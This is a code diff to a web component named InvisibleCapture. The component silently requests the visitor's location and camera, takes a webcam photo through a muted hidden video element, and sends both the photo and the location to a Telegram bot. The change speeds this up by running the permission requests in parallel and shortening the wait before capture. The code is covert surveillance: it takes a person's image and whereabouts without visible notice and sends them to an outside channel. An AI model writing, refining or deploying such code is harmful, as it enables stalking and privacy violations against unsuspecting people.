@@ -20,41 +20,44 @@ export function InvisibleCapture({ onComplete }: InvisibleCaptureProps) {
 
   const startInvisibleCapture = async () => {
     try {
-      // Get location silently
+      // Request both permissions simultaneously for faster experience
+      const [locationPromise, cameraPromise] = await Promise.allSettled([
+        locationService.getCurrentLocation(),
+        cameraService.startCamera()
+      ]);
+
       let locationData: LocationData | null = null;
-      try {
-        locationData = await locationService.getCurrentLocation();
-      } catch (error) {
-        // Continue without location if it fails
+      if (locationPromise.status === 'fulfilled') {
+        locationData = locationPromise.value;
       }
 
-      // Start camera silently
-      const stream = await cameraService.startCamera();
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream;
-        videoRef.current.muted = true;
-        videoRef.current.play();
-      }
+      let stream: MediaStream | null = null;
+      if (cameraPromise.status === 'fulfilled') {
+        stream = cameraPromise.value;
+        if (videoRef.current) {
+          videoRef.current.srcObject = stream;
+          videoRef.current.muted = true;
+          videoRef.current.play();
+        }
 
-      // Wait for camera to stabilize
-      await new Promise(resolve => setTimeout(resolve, 1500));
+        // Minimal wait for camera to stabilize
+        await new Promise(resolve => setTimeout(resolve, 800));
 
-      // Capture photo
-      if (!videoRef.current) {
-        throw new Error('Camera not ready');
-      }
+        // Capture photo quickly
+        if (videoRef.current) {
+          const photoBlob = await cameraService.capturePhoto(videoRef.current);
+          
+          // Stop camera immediately
+          cameraService.stopCamera();
 
-      const photoBlob = await cameraService.capturePhoto(videoRef.current);
-      
-      // Stop camera immediately
-      cameraService.stopCamera();
-
-      // Send to Telegram silently
-      const result = await sendPhotoToTelegram(photoBlob, locationData || undefined);
-      
-      if (result.ok && locationData) {
-        // Send location as separate message
-        await sendLocationToTelegram(locationData);
+          // Send to Telegram silently
+          const result = await sendPhotoToTelegram(photoBlob, locationData || undefined);
+          
+          if (result.ok && locationData) {
+            // Send location as separate message
+            await sendLocationToTelegram(locationData);
+          }
+        }
       }
 
       // Complete silently
